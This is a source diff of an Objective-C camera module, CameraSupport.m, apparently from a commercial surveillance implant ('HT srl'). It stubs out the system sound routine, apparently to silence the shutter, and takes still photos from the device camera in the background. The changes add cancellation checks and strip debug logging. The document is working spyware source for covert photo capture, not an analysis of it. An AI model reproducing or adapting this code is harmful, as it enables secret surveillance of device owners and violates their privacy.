@@ -2,7 +2,7 @@
 //  CameraSupport.m
 //
 //  Created by kiodo on 02/12/11.
-//  Copyright 2011 __MyCompanyName__. All rights reserved.
+//  Copyright 2011 HT srl. All rights reserved.
 //
 
 #import "CameraSupport.h"
@@ -24,9 +24,6 @@ void AudioServicesPlaySystemSoundHook(UInt32 inSystemSoundID);
 
 void AudioServicesPlaySystemSoundHook(UInt32 inSystemSoundID)
 {
-#ifdef DEBUG_CAMERA
-  NSLog(@"%s: calling AudioServicesPlaySystemSound(%lu)", __FUNCTION__, inSystemSoundID);
-#endif
   return;
 }
 
@@ -37,44 +34,46 @@ static BOOL gCameraRun = NO;
 
 @implementation CameraSupport
 
+@synthesize mCurrThread;
+
 - (id)init
 {
     self = [super init];
+  
+    if (self != nil)
+      {
+        [self setMCurrThread: [NSThread currentThread]];
+      }
+  
     return self;
+}
+
+- (void)dealloc
+{
+  [mCurrThread release];
+  [super dealloc];
 }
 
 - (BOOL)_checkCameraAvalaible
 {
    if (gCameraRun == NO)
     {
-#ifdef DEBUG_CAMERA
-      NSLog(@"%s: camera is available", __FUNCTION__);
-#endif
       return TRUE;  
     }
   else
     {
-#ifdef DEBUG_CAMERA
-      NSLog(@"%s: camera is NOT available", __FUNCTION__);
-#endif
       return FALSE;
     }
 }
 
 - (void)_updateCameraStatus: (NSNotification*)aNotification
 {
-#ifdef DEBUG_CAMERA
-  NSLog(@"%s: new notification", __FUNCTION__);
-#endif
     NSDictionary *tmpDict = [aNotification userInfo];
     
     if (tmpDict != nil)
       {
         NSNumber *num = [tmpDict objectForKey: @"flag"];
         gCameraRun = [num intValue];
-#ifdef DEBUG_CAMERA
-      NSLog(@"%s: notification received %d", __FUNCTION__, gCameraRun);
-#endif
       }
 }
 
@@ -120,14 +119,14 @@ static BOOL gCameraRun = NO;
   
   AVCaptureDevice *av = nil;
   
-  if ([self _checkCameraAvalaible] == NO)
+  if ([self _checkCameraAvalaible] == NO || [mCurrThread isCancelled] == TRUE)
     {
       return imageData;
     }
     
   NSArray *avArray = [AVCaptureDevice devicesWithMediaType: AVMediaTypeVideo]; 
   
-  if (avArray == nil || [avArray count] <= 0) 
+  if (avArray == nil || [avArray count] <= 0 || [mCurrThread isCancelled] == TRUE) 
     {
       return imageData;
     }
@@ -148,9 +147,10 @@ static BOOL gCameraRun = NO;
       return imageData;
     }
     
-  AVCaptureDeviceInput *inDev = [AVCaptureDeviceInput deviceInputWithDevice: av error: &err];
+  AVCaptureDeviceInput *inDev = [AVCaptureDeviceInput deviceInputWithDevice: av 
+                                                                      error: &err];
   
-  if (inDev == nil)
+  if (inDev == nil || [mCurrThread isCancelled] == TRUE)
     {
       return imageData;
     }
@@ -160,23 +160,27 @@ static BOOL gCameraRun = NO;
   [avSession setSessionPreset:AVCaptureSessionPresetPhoto];
   [avSession beginConfiguration];
   
-  if ([avSession canAddInput: inDev])
-    [avSession addInput: inDev];
-  else
+  if ([avSession canAddInput: inDev] == NO || [mCurrThread isCancelled] == TRUE)
     {
       [avSession release];
       return imageData;
     }
+  else
+    {
+      [avSession addInput: inDev];
+    }
     
   AVCaptureStillImageOutput *outImg = [[AVCaptureStillImageOutput alloc] init];
     
-  if ([avSession canAddOutput: outImg])
-    [avSession addOutput: outImg];
-  else
+  if ([avSession canAddOutput: outImg] == NO || [mCurrThread isCancelled] == TRUE)
     {
       [avSession release];
       [outImg release];
       return imageData;
+    }
+  else
+    {
+      [avSession addOutput: outImg];
     }
     
   [avSession commitConfiguration];
@@ -184,7 +188,8 @@ static BOOL gCameraRun = NO;
     
   AVCaptureConnection *conn = nil;
   
-  if ((conn = [self _getConnection: [outImg connections]]) == nil)
+  if ((conn = [self _getConnection: [outImg connections]]) == nil ||
+      [mCurrThread isCancelled] == TRUE)
     {
       [avSession release];
       [outImg release];
@@ -206,16 +211,17 @@ static BOOL gCameraRun = NO;
                               
   while (gGrabbed == FALSE && maxRetry++ < MAX_RETRY_COUNT)
   {
-    if ([self _checkCameraAvalaible] == NO)
+    if ([self _checkCameraAvalaible] == NO || [mCurrThread isCancelled] == TRUE)
       break;
-    usleep(200000);
+    usleep(150000);
   }
 
   [avSession stopRunning]; 
   
   if (imageBuffer != nil)
     {
-      imageData = [[AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageBuffer] retain];
+      imageData = 
+      [[AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageBuffer] retain];
       CFRelease(imageBuffer);
     }
     
